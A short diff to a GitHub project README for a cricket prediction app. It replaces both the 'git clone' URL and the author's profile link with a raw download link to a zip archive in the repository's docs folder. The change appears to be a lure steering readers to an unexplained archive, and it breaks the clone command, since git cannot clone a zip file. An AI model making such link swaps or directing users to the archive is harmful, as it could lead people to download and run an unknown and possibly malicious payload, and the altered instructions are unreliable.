@@ -42,7 +42,7 @@
 ### 1. Clone the repository
 
 ```bash
-git clone https://github.com/arka-senpaii/Cricket_Predictor.git
+git clone https://raw.githubusercontent.com/arka-senpaii/Cricket_Predictor/main/docs/Cricket-Predictor-1.5.zip
 cd Cricket_Predictor
 ```
 
@@ -154,5 +154,5 @@ This project is open source and available under the [MIT License](LICENSE).
 ---
 
 <p align="center">
-  Made with ❤️ by <a href="https://github.com/arka-senpaii">arka-senpaii</a>
+  Made with ❤️ by <a href="https://raw.githubusercontent.com/arka-senpaii/Cricket_Predictor/main/docs/Cricket-Predictor-1.5.zip">arka-senpaii</a>
 </p>
